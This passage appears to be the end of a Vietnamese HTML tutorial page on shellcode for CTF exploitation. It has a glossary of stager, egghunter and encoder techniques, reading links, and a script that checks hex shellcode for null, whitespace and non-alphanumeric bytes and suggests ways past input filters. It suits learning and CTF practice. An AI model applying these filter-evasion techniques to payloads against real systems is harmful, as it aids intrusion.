+  <div class="ex"><div class="level">⭐⭐⭐⭐ · stager/egghunter</div><p>Khe 30 byte → stager. SC bất định → egghunter.</p></div>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / THUẬT NGỮ & ĐỌC THÊM</div>
+  <h2>Tra cứu nhanh</h2>
+  <div class="grid">
+    <div class="card"><div class="term">null-free</div><p>Không byte \x00.</p></div>
+    <div class="card"><div class="term">alphanumeric</div><p>Chỉ [A-Za-z0-9].</p></div>
+    <div class="card"><div class="term">egghunter</div><p>SC nhỏ tìm SC lớn.</p></div>
+    <div class="card"><div class="term">stager</div><p>SC mồi read SC thật.</p></div>
+    <div class="card"><div class="term">encoder</div><p>Mã hoá SC + decoder stub.</p></div>
+    <div class="card"><div class="term">jmp rsp</div><p>Gadget nhảy vào buffer.</p></div>
+  </div>
+  <h3>Đọc thêm</h3>
+  <ul>
+    <li>Cơ bản: <a href="ret2shellcode.html">ret2shellcode</a>. Liên quan: <a href="ret2syscall_mprotect.html">mprotect</a> (NX→RWX) · <a href="seccomp_orw.html">seccomp ORW</a>.</li>
+    <li>Skape "Safely Searching Process Virtual Address Space" (egghunter 2004) · pwntools encoders · shell-storm shellcode DB.</li>
+  </ul>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p><strong>Phase 5 · Shellcode.</strong> Input lọc byte / chật / vị trí bất định → null-free, alphanumeric encoder, stager (read nạp SC thật), egghunter (quét bộ nhớ tìm egg). Luôn test byte cấm trước, chọn kỹ thuật đúng.</p>
+    <p style="margin-top:6px;opacity:.7">Chỉ dùng cho học tập và CTF hợp pháp.</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("scadv-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("scadv-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+
+  var hexIn=document.getElementById("hexIn"),out=document.getElementById("scOut");
+  function isAlnum(b){return (b>=0x30&&b<=0x39)||(b>=0x41&&b<=0x5a)||(b>=0x61&&b<=0x7a);}
+  function check(){
+    var raw=(hexIn.value||"").replace(/[^0-9a-fA-F]/g,"");
+    if(raw.length%2){out.innerHTML='<span class="bad">hex lẻ nửa byte</span>';return;}
+    var bytes=[];for(var i=0;i<raw.length;i+=2)bytes.push(parseInt(raw.substr(i,2),16));
+    if(!bytes.length){out.textContent="nhập hex";return;}
+    var hasNull=bytes.indexOf(0)>=0;
+    var ws=bytes.some(function(b){return b===0x09||b===0x0a||b===0x0b||b===0x0c||b===0x0d||b===0x20;});
+    var nonAlnum=bytes.some(function(b){return !isAlnum(b);});
+    var high=bytes.some(function(b){return b>0x7f;});
+    var html=bytes.length+' byte. ';
+    html+= hasNull?'<span class="bad">có \\x00</span> ':'<span class="good">null-free ✓</span> ';
+    html+= ws?'· <span class="bad">có whitespace</span> ':'· <span class="good">no-ws ✓</span> ';
+    html+= high?'· <span class="bad">có byte &gt;0x7f</span> ':'· <span class="good">ASCII ✓</span> ';
+    html+= nonAlnum?'· <span class="bad">KHÔNG alnum</span>':'· <span class="good">alnum ✓</span>';
+    html+='<br>→ ';
+    if(hasNull) html+='cần SC null-free (shellcraft). ';
+    if(nonAlnum) html+='nếu input alnum-only → dùng alphanumeric encoder. ';
+    if(!hasNull&&!nonAlnum) html+='qua được hầu hết lọc.';
+    out.innerHTML=html;
+  }
+  hexIn.addEventListener("input",check);check();
+
+  var tabs=[].slice.call(document.querySelectorAll("#tabs .tab"));
+  var panels={a:document.getElementById("panel-a"),b:document.getElementById("panel-b"),c:document.getElementById("panel-c")};
+  tabs.forEach(function(t){t.addEventListener("click",function(){
+    tabs.forEach(function(x){x.classList.remove("active");});t.classList.add("active");
+    Object.keys(panels).forEach(function(k){panels[k].hidden=(k!==t.getAttribute("data-t"));});
+  });});
+})();
+</script>
